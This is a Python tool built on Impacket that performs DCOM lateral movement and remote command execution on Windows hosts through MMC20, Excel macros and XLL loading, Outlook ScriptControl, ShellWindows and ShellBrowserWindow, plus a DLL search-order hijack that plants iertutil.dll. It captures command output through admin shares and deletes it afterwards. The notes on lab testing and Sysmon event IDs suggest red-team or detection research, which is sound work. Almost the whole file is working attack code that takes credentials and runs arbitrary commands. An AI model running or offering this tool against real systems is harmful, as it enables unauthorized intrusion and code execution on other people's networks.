#!/usr/bin/env python3
"""
Custom Impacket-based DCOM RCE for MMC20.Application, Excel.Application,
Outlook.Application, ShellWindows, and ShellBrowserWindow -- raw DCE/RPC
IDispatch calls (no Windows COM API / .NET interop involved), same pattern
dcomexec.py uses for MMC20/ShellWindows, extended to Excel/Outlook and fixed
for ShellWindows/ShellBrowserWindow.

Output is captured the same way dcomexec.py does it: the remote command is
wrapped to redirect stdout/stderr to the target's own ADMIN$ share via the
127.0.0.1 loopback, then the host reads that file back over its own SMB
session to the target and deletes it. No more manually checking a file on
the target -- output prints straight to your host console.

Preconditions:
  - ShellWindows / ShellBrowserWindow require at least one Explorer folder
    window already open in the target's interactive session (see the
    schtasks /it trick in the report). Without it, .Item() / the ROT lookup
    returns nothing and the chain aborts.
  - ie (InternetExplorer.Application) is NOT reproducible remotely at all,
    by design, on Vista+/Server 2008+ targets -- this was root-caused
    empirically on this lab's webserver02 (Windows Server), not assumed:
      1. AppID {e4803a36-7232-4ac0-a6af-29d59ebcc303} has no RunAs value
         by default -> SCM should run it as "the launching user", like
         mmc20/excel/outlook. CoCreateInstanceEx times out anyway
         (System log: DistributedCOM EID 10010, "did not register with
         DCOM within the required timeout"), even with an interactive
         Administrator session already logged into the console.
      2. The AppID key is TrustedInstaller-owned (BUILTIN\\Administrators
         only has ReadKey; even NT AUTHORITY\\SYSTEM only has ReadKey) --
         Set-ItemProperty/reg add for RunAs fails Access Denied until you
         take ownership + grant yourself FullControl first.
      3. After taking ownership and explicitly setting RunAs=Interactive
         User, activation STILL times out with the same EID 10010, and
         `tasklist` polled every ~4s for the full activation window never
         shows iexplore.exe spawning even once -- the process is never
         created, not crashing after creation.
    Root cause: Session 0 isolation (Vista+/Server 2008+) means RPCSS
    (Session 0, non-interactive) cannot create a new process running as
    "the interactive user" for an activation request from a *network*
    caller -- there's no interactive token to hand it, and unlike a local
    caller there's no session context to infer one from. This is a fixed
    OS security boundary, not a config/permission problem, and no
    registry change works around it. ShellWindows/ShellBrowserWindow look
    similar (same RunAs=Interactive User requirement) but actually work
    remotely because they never ask SCM to launch a *new* process -- they
    bind via ROT to an explorer.exe *already running* in the interactive
    session, so the launch-as-interactive-user path is never invoked.

Usage:
  impacket_custom_rce.py <mmc20|excel|excel_xll|outlook|outlook_scriptcontrol|shellwindows|shellbrowserwindow|ie> \
      <target_ip> <username> <password> [domain] [command-or-dll-path-or-jscript]

  <command> is the OS command to run, e.g. "whoami" or "ipconfig /all".
  Defaults to "whoami" if omitted.
  For excel_xll / ie, arg 6 is a LOCAL FILE PATH (the .xll to RegisterXLL, or
  the iertutil.dll to plant in C:\\Program Files\\Internet Explorer\\ and load
  via DLL search-order hijack on DCOM activation), NOT a command.
  For ie, pass '-' or 'skip' as arg 6 to skip the SMB upload and reuse the
  DLL already planted on the target from a previous run.
  For outlook_scriptcontrol, arg 6 is raw JScript source (executed
  synchronously by ScriptControl.AddCode()), NOT a shell command. Defaults
  to DEFAULT_JSCRIPT, which spawns WScript.Shell to write a marker file --
  see the module-level comment above invoke_outlook_scriptcontrol().
"""
import sys
import time
import random
import logging
from impacket.dcerpc.v5.dcom.oaut import IID_IDispatch, string_to_bin, IDispatch, DISPPARAMS, \
    DISPATCH_PROPERTYGET, DISPATCH_METHOD, DISPATCH_PROPERTYPUT, VARIANT, VARENUM
from impacket.dcerpc.v5.dcomrt import DCOMConnection, OBJREF, FLAGS_OBJREF_CUSTOM, OBJREF_CUSTOM, \
    OBJREF_HANDLER, OBJREF_EXTENDED, OBJREF_STANDARD, FLAGS_OBJREF_HANDLER, FLAGS_OBJREF_STANDARD, \
    FLAGS_OBJREF_EXTENDED, IRemUnknown2, INTERFACE, SORF_NOPING
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smbconnection import SMBConnection

import os
logging.basicConfig(level=logging.DEBUG if os.environ.get('RCE_DEBUG') else logging.INFO)

CLSIDS = {
    "mmc20": "49B2791A-B1AE-4C90-9B8E-E860BA07F889",
    "excel": "00024500-0000-0000-C000-000000000046",
    "outlook": "0006F03A-0000-0000-C000-000000000046",
    "shellwindows": "9BA05972-F6A8-11CF-A442-00A0C90A8F39",
    "shellbrowserwindow": "C08AFD90-F2A1-11D1-8455-00A0C91F3880",
    "ie": "0002DF01-0000-0000-C000-000000000046",
}

SHARE = 'ADMIN$'
CODEC = sys.stdout.encoding or 'cp1252'

# --------------------------------------------------------------------------
# IDispatch / OBJREF plumbing
# --------------------------------------------------------------------------

def get_interface(iface, resp):
    objRefType = OBJREF(b''.join(resp))['flags']
    if objRefType == FLAGS_OBJREF_CUSTOM:
        objRef = OBJREF_CUSTOM(b''.join(resp))
    elif objRefType == FLAGS_OBJREF_HANDLER:
        objRef = OBJREF_HANDLER(b''.join(resp))
    elif objRefType == FLAGS_OBJREF_STANDARD:
        objRef = OBJREF_STANDARD(b''.join(resp))
    elif objRefType == FLAGS_OBJREF_EXTENDED:
        objRef = OBJREF_EXTENDED(b''.join(resp))
    else:
        raise Exception("Unknown OBJREF Type! 0x%x" % objRefType)
    # Mirror INTERFACE.process_interface(): register the sub-object's real OID
    # in the target's DCOM ping set, or impacket's keep-alive thread never
    # pings it and the server drops it (RPC_E_DISCONNECTED on the next call).
    if objRefType != FLAGS_OBJREF_CUSTOM and objRef['std']['flags'] & SORF_NOPING == 0:
        DCOMConnection.addOid(iface.get_target(), objRef['std']['oid'])
    return IRemUnknown2(INTERFACE(iface.get_cinstance(), None, iface.get_ipidRemUnknown(),
                                   objRef['std']['ipid'], oxid=objRef['std']['oxid'],
                                   oid=objRef['std']['oid'], target=iface.get_target()))

def bstr_arg(value):
    v = VARIANT(None, False)
    v['clSize'] = 5
    v['vt'] = VARENUM.VT_BSTR
    v['_varUnion']['tag'] = VARENUM.VT_BSTR
    v['_varUnion']['bstrVal']['asData'] = value
    return v

def i4_arg(value):
    v = VARIANT(None, False)
    v['clSize'] = 5
    v['vt'] = VARENUM.VT_I4
    v['_varUnion']['tag'] = VARENUM.VT_I4
    v['_varUnion']['lVal'] = value
    return v

def bool_arg(value):
    v = VARIANT(None, False)
    v['clSize'] = 5
    v['vt'] = VARENUM.VT_BOOL
    v['_varUnion']['tag'] = VARENUM.VT_BOOL
    v['_varUnion']['boolVal'] = 0xffff if value else 0x0000
    return v

def empty_arg():
    v = VARIANT(None, False)
    v['clSize'] = 5
    v['vt'] = VARENUM.VT_EMPTY
    v['_varUnion']['tag'] = VARENUM.VT_EMPTY
    return v

def empty_dispparams():
    d = DISPPARAMS(None, False)
    d['rgvarg'] = NULL
    d['rgdispidNamedArgs'] = NULL
    d['cArgs'] = 0
    d['cNamedArgs'] = 0
    return d

def call_method(iDisp, method_name, args):
    """args: list of VARIANT, in logical left-to-right parameter order."""
    dispid = iDisp.GetIDsOfNames((method_name,))[0]
    d = DISPPARAMS(None, False)
    d['rgdispidNamedArgs'] = NULL
    d['cArgs'] = len(args)
    d['cNamedArgs'] = 0
    for a in reversed(args):
        d['rgvarg'].append(a)
    return iDisp.Invoke(dispid, 0x409, DISPATCH_METHOD, d, 0, [], [])

def get_prop(iDisp, prop_name):
    dispid = iDisp.GetIDsOfNames((prop_name,))[0]
    return iDisp.Invoke(dispid, 0x409, DISPATCH_PROPERTYGET, empty_dispparams(), 0, [], [])

def put_prop(iDisp, prop_name, value):
    dispid = iDisp.GetIDsOfNames((prop_name,))[0]
    d = DISPPARAMS(None, False)
    d['rgdispidNamedArgs'] = NULL
    d['cArgs'] = 1
    d['cNamedArgs'] = 0
    d['rgvarg'].append(value)
    return iDisp.Invoke(dispid, 0x409, DISPATCH_PROPERTYPUT, d, 0, [], [])

def step(label, fn):
    try:
        result = fn()
        print("[+] %s OK" % label)
        return result
    except Exception as e:
        print("[-] %s FAILED: %s" % (label, e))
        raise

# --------------------------------------------------------------------------
# Output capture over the target's own ADMIN$ (loopback SMB), read back by host
# --------------------------------------------------------------------------

def smb_connect(addr, username, password, domain):
    smb = SMBConnection(addr, addr)
    smb.login(username, password, domain, '', '')
    return smb

# Techniques whose spawned process runs under the *interactive* (UAC-filtered,
# non-admin) desktop token -- RunAs=Interactive User -- and therefore cannot
# write to \\127.0.0.1\ADMIN$ (needs admin rights). For those we redirect to
# the world-writable C:\Users\Public instead, and fetch it back via the C$
# administrative share (host's own SMB session is Administrator, unaffected
# by the target process's token).
INTERACTIVE_TOKEN_TECHNIQUES = {'shellwindows', 'shellbrowserwindow'}

def wrap_command(user_command, technique):
    """Returns (full_command_string_to_run_via_cmd, share, unc_path_for_cmd, out_name)."""
    out_name = '__' + str(time.time())[:5] + str(random.randint(1000, 9999))
    if technique in INTERACTIVE_TOKEN_TECHNIQUES:
        share = 'C$'
        rel_path = 'Users\\Public\\%s' % out_name
        redirect_target = 'C:\\Users\\Public\\%s' % out_name
    else:
        share = SHARE
        rel_path = out_name
        redirect_target = '\\\\127.0.0.1\\%s\\%s' % (SHARE, out_name)
    wrapped = '/Q /c %s 1> "%s" 2>&1' % (user_command, redirect_target)
    return wrapped, share, rel_path, out_name

def fetch_output(smb, share, rel_path, timeout_s=20):
    buf = []
    def cb(data):
        buf.append(data)

    deadline = time.time() + timeout_s
    while time.time() < deadline:
        try:
            smb.getFile(share, rel_path, cb)
            break
        except Exception as e:
            es = str(e)
            if 'STATUS_SHARING_VIOLATION' in es or 'STATUS_OBJECT_NAME_NOT_FOUND' in es \
               or 'STATUS_OBJECT_PATH_NOT_FOUND' in es:
                time.sleep(1)
                continue
            elif 'Broken' in es:
                smb.reconnect()
                continue
            else:
                print("[-] fetch_output error: %s" % e)
                return None
    else:
        print("[-] fetch_output timed out waiting for %s\\%s" % (share, rel_path))
        return None

    try:
        smb.deleteFile(share, rel_path)
    except Exception:
        pass

    raw = b''.join(buf)
    try:
        return raw.decode(CODEC)
    except UnicodeDecodeError:
        return raw.decode(CODEC, errors='replace')

# --------------------------------------------------------------------------
# Per-technique DCOM invocation (raw shell command in, no output handling)
# --------------------------------------------------------------------------

def invoke_mmc20(dcom, shell_command):
    iInterface = step("CoCreateInstanceEx(MMC20.Application)",
                      lambda: dcom.CoCreateInstanceEx(string_to_bin(CLSIDS["mmc20"]), IID_IDispatch))
    iMMC = IDispatch(iInterface)

    resp = step("MMC.Document", lambda: get_prop(iMMC, 'Document'))
    iDocument = IDispatch(get_interface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))

    resp = step("Document.ActiveView", lambda: get_prop(iDocument, 'ActiveView'))
    iActiveView = IDispatch(get_interface(iDocument, resp['pVarResult']['_varUnion']['pdispVal']['abData']))

    step("ActiveView.ExecuteShellCommand",
         lambda: call_method(iActiveView, 'ExecuteShellCommand',
                             [bstr_arg('cmd.exe'), bstr_arg('C:\\Windows\\System32'), bstr_arg(shell_command), bstr_arg('7')]))

def invoke_outlook(dcom, shell_command):
    iInterface = step("CoCreateInstanceEx(Outlook.Application)",
                      lambda: dcom.CoCreateInstanceEx(string_to_bin(CLSIDS["outlook"]), IID_IDispatch))
    iOutlook = IDispatch(iInterface)

    resp = step("CreateObject('WScript.Shell')",
                lambda: call_method(iOutlook, 'CreateObject', [bstr_arg('WScript.Shell')]))
    iShell = IDispatch(get_interface(iOutlook, resp['pVarResult']['_varUnion']['pdispVal']['abData']))

    step("Shell.Run(...)",
         lambda: call_method(iShell, 'Run', [bstr_arg('cmd.exe ' + shell_command), i4_arg(0), bool_arg(False)]))

# enigma0x3/SpecterOps, Nov 2017: "Lateral Movement Using Outlook's CreateObject
# Method and DotNetToJScript" -- Outlook.CreateObject('ScriptControl') loads
# msscript.ocx IN-PROC into OUTLOOK.EXE (Sysmon EID 7), then setting
# .Language + calling .AddCode(code) executes the script's top-level
# statements synchronously, no file/process artifact needed for the script
# engine itself. The original technique chains DotNetToJScript here to
# deserialize an arbitrary .NET assembly from the JScript string; this PoC
# runs jscript_code directly to prove the AddCode() RCE primitive and the
# msscript.ocx load -- swap DEFAULT_JSCRIPT for a DotNetToJScript payload to
# reproduce the full original technique.
DEFAULT_JSCRIPT = (
    'new ActiveXObject("WScript.Shell").Run('
    '"cmd.exe /c whoami > C:\\\\Users\\\\Public\\\\scriptcontrol_poc.txt", 0, false);'
)

def invoke_outlook_scriptcontrol(dcom, jscript_code):
    iInterface = step("CoCreateInstanceEx(Outlook.Application)",
                      lambda: dcom.CoCreateInstanceEx(string_to_bin(CLSIDS["outlook"]), IID_IDispatch))
    iOutlook = IDispatch(iInterface)

    resp = step("CreateObject('ScriptControl')",
                lambda: call_method(iOutlook, 'CreateObject', [bstr_arg('ScriptControl')]))
    iScriptControl = IDispatch(get_interface(iOutlook, resp['pVarResult']['_varUnion']['pdispVal']['abData']))

    step("ScriptControl.Language = 'JScript'",
         lambda: put_prop(iScriptControl, 'Language', bstr_arg('JScript')))

    step("ScriptControl.AddCode(...)",
         lambda: call_method(iScriptControl, 'AddCode', [bstr_arg(jscript_code)]))

def invoke_excel(dcom, shell_command):
    iInterface = step("CoCreateInstanceEx(Excel.Application)",
                      lambda: dcom.CoCreateInstanceEx(string_to_bin(CLSIDS["excel"]), IID_IDispatch))
    iExcel = IDispatch(iInterface)

    try:
        dispid = iExcel.GetIDsOfNames(('DisplayAlerts',))[0]
        d = DISPPARAMS(None, False)
        d['rgdispidNamedArgs'] = NULL
        d['cArgs'] = 1
        d['cNamedArgs'] = 0
        d['rgvarg'].append(bool_arg(False))
        iExcel.Invoke(dispid, 0x409, DISPATCH_PROPERTYPUT, d, 0, [], [])
        print("[+] DisplayAlerts=False OK")
    except Exception as e:
        print("[~] DisplayAlerts=False non-fatal failure: %s" % e)

    full_cmd = 'cmd.exe ' + shell_command
    macro = 'EXEC("%s")' % full_cmd.replace('"', '""')
    step("ExecuteExcel4Macro(EXEC)", lambda: call_method(iExcel, 'ExecuteExcel4Macro', [bstr_arg(macro)]))

def invoke_excel_xll(dcom, xll_target_path):
    """Application.RegisterXLL(path) -- loads path as a DLL directly into
    EXCEL.EXE's own address space and calls its xlAutoOpen() export. Code
    runs inside the Excel process itself: Sysmon shows this as an Image
    Load (EID 7) for EXCEL.EXE, not a new Process Create for the XLL file
    itself -- the payload's own actions (e.g. spawning cmd.exe) are what
    show up as EID 1."""
    iInterface = step("CoCreateInstanceEx(Excel.Application)",
                      lambda: dcom.CoCreateInstanceEx(string_to_bin(CLSIDS["excel"]), IID_IDispatch))
    iExcel = IDispatch(iInterface)

    step("RegisterXLL('%s')" % xll_target_path,
         lambda: call_method(iExcel, 'RegisterXLL', [bstr_arg(xll_target_path)]))

def invoke_shellwindows(dcom, shell_command):
    iInterface = step("CoCreateInstanceEx(ShellWindows)",
                      lambda: dcom.CoCreateInstanceEx(string_to_bin(CLSIDS["shellwindows"]), IID_IDispatch))
    iShellWindows = IDispatch(iInterface)

    resp = step("ShellWindows.Item()", lambda: call_method(iShellWindows, 'Item', []))
    iItem = IDispatch(get_interface(iShellWindows, resp['pVarResult']['_varUnion']['pdispVal']['abData']))

    resp = step("Item.Document", lambda: get_prop(iItem, 'Document'))
    iDocument = IDispatch(get_interface(iItem, resp['pVarResult']['_varUnion']['pdispVal']['abData']))

    resp = step("Document.Application", lambda: get_prop(iDocument, 'Application'))
    iApp = IDispatch(get_interface(iDocument, resp['pVarResult']['_varUnion']['pdispVal']['abData']))

    step("Application.ShellExecute",
         lambda: call_method(iApp, 'ShellExecute',
                             [bstr_arg('cmd.exe'), bstr_arg(shell_command), bstr_arg('C:\\Windows\\System32'),
                              empty_arg(), i4_arg(0)]))

def invoke_shellbrowserwindow(dcom, shell_command):
    iInterface = step("CoCreateInstanceEx(ShellBrowserWindow)",
                      lambda: dcom.CoCreateInstanceEx(string_to_bin(CLSIDS["shellbrowserwindow"]), IID_IDispatch))
    iBrowser = IDispatch(iInterface)

    resp = step("ShellBrowserWindow.Document", lambda: get_prop(iBrowser, 'Document'))
    iDocument = IDispatch(get_interface(iBrowser, resp['pVarResult']['_varUnion']['pdispVal']['abData']))

    resp = step("Document.Application", lambda: get_prop(iDocument, 'Application'))
    iApp = IDispatch(get_interface(iDocument, resp['pVarResult']['_varUnion']['pdispVal']['abData']))

    step("Application.ShellExecute",
         lambda: call_method(iApp, 'ShellExecute',
                             [bstr_arg('cmd.exe'), bstr_arg(shell_command), bstr_arg('C:\\Windows\\System32'),
                              empty_arg(), i4_arg(0)]))

def invoke_ie(dcom, shell_command):
    """InternetExplorer.Application -- DLL search-order hijack only.
    Activation of the DCOM class spawns iexplore.exe (DllHost broker), which
    loads iertutil.dll from its OWN directory (C:\\Program Files\\Internet
    Explorer\\) via the standard DLL search order when a planted copy exists.
    No shell-command wrapping/output-capture is used here -- the payload's
    OWN actions (poc.c: calc.exe + marker file) are the proof, verified
    out-of-band (guestcontrol / Sysmon), same as excel_xll."""
    iInterface = step("CoCreateInstanceEx(InternetExplorer.Application)",
                      lambda: dcom.CoCreateInstanceEx(string_to_bin(CLSIDS["ie"]), IID_IDispatch))
    iIE = IDispatch(iInterface)

    try:
        step("IE.Quit()", lambda: call_method(iIE, 'Quit', []))
    except Exception as e:
        print("[~] IE.Quit non-fatal failure: %s" % e)

INVOKERS = {
    "mmc20": invoke_mmc20,
    "outlook": invoke_outlook,
    "excel": invoke_excel,
    "shellwindows": invoke_shellwindows,
    "shellbrowserwindow": invoke_shellbrowserwindow,
    "ie": invoke_ie,
}

# --------------------------------------------------------------------------
# Orchestration: run + capture output on host
# --------------------------------------------------------------------------

def run(technique, addr, username, password, domain, user_command):
    invoker = INVOKERS.get(technique)
    if invoker is None:
        print("Unknown technique %s (choices: %s)" % (technique, ', '.join(INVOKERS)))
        return

    smb = smb_connect(addr, username, password, domain)
    dcom = DCOMConnection(addr, username, password, domain, '', '', None, oxidResolver=True, doKerberos=False)

    wrapped, share, rel_path, out_name = wrap_command(user_command, technique)
    try:
        invoker(dcom, wrapped)
        print("[%s] command dispatched, waiting for output..." % technique)
        output = fetch_output(smb, share, rel_path)
        print("-" * 60)
        print(output if output is not None else "(no output captured)")
        print("-" * 60)
    except Exception as e:
        print("[%s] ABORTED: %s" % (technique, e))
    finally:
        dcom.disconnect()
        try:
            smb.close()
        except Exception:
            pass

def run_xll(addr, username, password, domain, local_xll_path):
    """excel_xll: upload the .xll to the target's Public folder over SMB,
    then call Application.RegisterXLL() on that path. No shell-command
    wrapping/output-capture is used here -- the payload's OWN actions
    (e.g. writing C:\\Users\\Public\\xll_poc.txt, spawning cmd.exe) are the
    proof, verified out-of-band (guestcontrol / Sysmon), same as the
    DLL search-order hijack PoC."""
    import ntpath
    import io
    remote_name = ntpath.basename(local_xll_path)
    remote_path = 'C:\\Users\\Public\\' + remote_name

    smb = smb_connect(addr, username, password, domain)
    with open(local_xll_path, 'rb') as f:
        data = f.read()
    bio = io.BytesIO(data)
    smb.putFile('C$', 'Users\\Public\\' + remote_name, bio.read)
    smb.close()
    print("[excel_xll] Uploaded %s -> %s (%d bytes)" % (local_xll_path, remote_path, len(data)))

    dcom = DCOMConnection(addr, username, password, domain, '', '', None, oxidResolver=True, doKerberos=False)
    try:
        invoke_excel_xll(dcom, remote_path)
        print("[excel_xll] RegisterXLL dispatched -- check target for xlAutoOpen side effects (xll_poc.txt / calc.exe)")
    except Exception as e:
        print("[excel_xll] ABORTED: %s" % e)
    finally:
        dcom.disconnect()

def run_ie(addr, username, password, domain, local_dll_path):
    """ie: upload the hijack DLL to C:\\Program Files\\Internet Explorer\\
    iertutil.dll over the C$ admin share (triggers Sysmon EID 11, Image=System),
    then activate InternetExplorer.Application over DCOM (spawns iexplore.exe
    which loads the planted iertutil.dll via search-order hijack, triggering
    Sysmon EID 7). No shell-command wrapping/output-capture is used -- the
    payload's OWN actions (poc.c: calc.exe + C:\\Users\\Public\\iertutil_hijack_poc.txt)
    are the proof, verified out-of-band.

    local_dll_path == '-' or 'skip' skips the SMB upload entirely (DLL
    already planted on the target from a previous run) and goes straight
    to the DCOM activation step."""
    import io
    remote_path = 'C:\\Program Files\\Internet Explorer\\iertutil.dll'

    if local_dll_path in ('-', 'skip'):
        print("[ie] Skipping upload, using DLL already at %s" % remote_path)
    else:
        smb = smb_connect(addr, username, password, domain)
        with open(local_dll_path, 'rb') as f:
            data = f.read()
        bio = io.BytesIO(data)
        smb.putFile('C$', 'Program Files\\Internet Explorer\\iertutil.dll', bio.read)
        smb.close()
        print("[ie] Uploaded %s -> %s (%d bytes)" % (local_dll_path, remote_path, len(data)))

    dcom = DCOMConnection(addr, username, password, domain, '', '', None, oxidResolver=True, doKerberos=False)
    try:
        invoke_ie(dcom, '')
        print("[ie] IE activation dispatched -- check target for iertutil.dll side effects (calc.exe / iertutil_hijack_poc.txt)")
    except Exception as e:
        print("[ie] ABORTED: %s" % e)
    finally:
        dcom.disconnect()

def run_outlook_scriptcontrol(addr, username, password, domain, jscript_code):
    dcom = DCOMConnection(addr, username, password, domain, '', '', None, oxidResolver=True, doKerberos=False)
    try:
        invoke_outlook_scriptcontrol(dcom, jscript_code)
        print("[outlook_scriptcontrol] AddCode dispatched -- verify out-of-band: "
              "msscript.ocx loaded into OUTLOOK.EXE (Sysmon EID 7 / process module list) "
              "and the JScript side effect (default: C:\\Users\\Public\\scriptcontrol_poc.txt)")
    except Exception as e:
        print("[outlook_scriptcontrol] ABORTED: %s" % e)
    finally:
        dcom.disconnect()

if __name__ == "__main__":
    if len(sys.argv) < 5:
        print(__doc__)
        sys.exit(1)
    technique, addr, username, password = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
    domain = sys.argv[5] if len(sys.argv) > 5 else ''

    if technique == 'excel_xll':
        local_xll_path = sys.argv[6] if len(sys.argv) > 6 else 'poc.xll'
        run_xll(addr, username, password, domain, local_xll_path)
    elif technique == 'ie':
        local_dll_path = sys.argv[6] if len(sys.argv) > 6 else 'iertutil.dll'
        run_ie(addr, username, password, domain, local_dll_path)
    elif technique == 'outlook_scriptcontrol':
        jscript_code = sys.argv[6] if len(sys.argv) > 6 else DEFAULT_JSCRIPT
        run_outlook_scriptcontrol(addr, username, password, domain, jscript_code)
    else:
        user_command = sys.argv[6] if len(sys.argv) > 6 else 'whoami'
        run(technique, addr, username, password, domain, user_command)
